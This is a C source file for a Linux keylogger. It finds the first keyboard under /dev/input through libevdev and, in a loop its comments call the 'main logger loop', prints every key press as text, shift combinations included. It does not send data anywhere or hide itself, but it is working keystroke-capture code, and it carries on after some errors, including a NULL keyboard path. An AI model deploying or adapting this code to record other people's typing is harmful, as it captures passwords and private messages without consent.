#include <libevdev/libevdev.h>
#include <ctype.h> 
#include <stdbool.h>
#include <linux/input.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>

//key map refer to: https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h

bool shift = false;

static const char table[256] = {
  [0]  = '\0',
  [2]  = '1',
  [3]  = '2',
  [4]  = '3',
  [5]  = '4',
  [6]  = '5',
  [7]  = '6',
  [8]  = '7',
  [9]  = '8',
  [10] = '9',
  [11] = '0',
  [12] = '-',
  [13] = '=',
  [16] = 'q',
  [17] = 'w',
  [18] = 'e',
  [19] = 'r',
  [20] = 't',
  [21] = 'y',
  [22] = 'u',
  [23] = 'i',
  [24] = 'o',
  [25] = 'p',
  [26] = '[',
  [27] = ']',
  [30] = 'a',
  [31] = 's',
  [32] = 'd',
  [33] = 'f',
  [34] = 'g',
  [35] = 'h',
  [36] = 'j',
  [37] = 'k',
  [38] = 'l',
  [39] = ';',
  [40] = '\'',
  [41] = '`',
  [43] = '\\',
  [44] = 'z',
  [45] = 'x',
  [46] = 'c',
  [47] = 'v',
  [48] = 'b',
  [49] = 'n',
  [50] = 'm',
  [51] = ',',
  [52] = '.',
  [53] = '/',
  [55] = '*',
  [57] = ' ',
};

static const char shift_table[256] = {
  [0] = '\0',
  [KEY_GRAVE] = '~',
  [KEY_1] = '!',
  [KEY_2] = '@',
  [KEY_3] = '#',
  [KEY_4] = '$',
  [KEY_5] = '%',
  [KEY_6] = '^',
  [KEY_7] = '&',
  [KEY_8] = '*',
  [KEY_9] = '(',
  [KEY_0] = ')',
  [KEY_MINUS] = '_',
  [KEY_EQUAL] = '+',
  [KEY_BACKSLASH] = '|',
  [KEY_SEMICOLON] = ':',
  [KEY_APOSTROPHE] = '\"',
  [KEY_LEFTBRACE] = '{',
  [KEY_RIGHTBRACE] = '}',
  [KEY_COMMA] = '<',
  [KEY_DOT] = '>',
  [KEY_SLASH] = '?', 
};

char* get_kb(char* buf, size_t buf_size){
  struct libevdev *dev;
  struct dirent *de;
  DIR *dr = opendir("/dev/input");

  if (dr == NULL) {
    printf("Could not open current directory" );
    return 0;
  }


  while ((de = readdir(dr)) != NULL) {
    if(strstr(de->d_name, "event") != NULL){
      //get real path of the input file
      snprintf(buf, buf_size, "/dev/input/%s", de->d_name);

      //open the input file stream first
      int fd = open(buf, O_RDONLY|O_NONBLOCK);
      //error
      if(fd < 0){
        fprintf(stderr, "error: %d %s\n", errno, strerror(errno));
      }


      //initialize the evdev device
      int rc = libevdev_new_from_fd(fd, &dev);
      //error
      if(rc < 0){
        fprintf(stderr, "error: %d %s\n", -rc, strerror(-rc));
      }

      //detect kyboard when device supports event code KEY_A
      if(libevdev_has_event_code(dev, EV_KEY, KEY_A)){
        printf("Device: %s\n", libevdev_get_name(dev));
        printf("vendor: %x product: %x\n",
              libevdev_get_id_vendor(dev),
              libevdev_get_id_product(dev));
        //returns first keyboard found
        return buf;
      }
            
      //shutdown
      libevdev_free(dev);
      close(fd);
    }
  }
  //no kb
  return NULL;
}


int main(){
  char path[PATH_MAX];
  const char* kb_path = get_kb(path, sizeof(path));
  if(kb_path == NULL){
    printf("no kb\n");
  }else{
    printf("Keyboard: %s\n", kb_path);
  }

  //open up the kb input event file
  int fd = open(kb_path, O_RDONLY);

  //buffer to read input events
  struct input_event event;


  //main logger loop
  while (true) {
    read(fd, &event, sizeof(struct input_event));

    //type has to be key and value 1 is key press
    if(event.type == EV_KEY && event.value == 1){
      switch(event.code){
        case KEY_ENTER:
          printf("\n");
          break;
        case KEY_BACKSPACE:
          printf("\b \b");
          //manually flush buffer
          fflush(stdout);
          break;
        case KEY_LEFTSHIFT:
          shift = true;
          break;
        case KEY_TAB:
          printf("\t");
          fflush(stdout);
          break;
        default:
          if(shift && shift_table[event.code] != '\0'){
            printf("%c", shift_table[event.code]);
            fflush(stdout);
          } else if(shift && shift_table[event.code] == '\0'){
            printf("%c", toupper(table[event.code]));
            fflush(stdout);
          }
          else{
            printf("%c", table[event.code]);
            fflush(stdout);
          }
      }
    } else if(event.code == KEY_LEFTSHIFT && event.value == 0){
      shift = false;
    }

  }
}
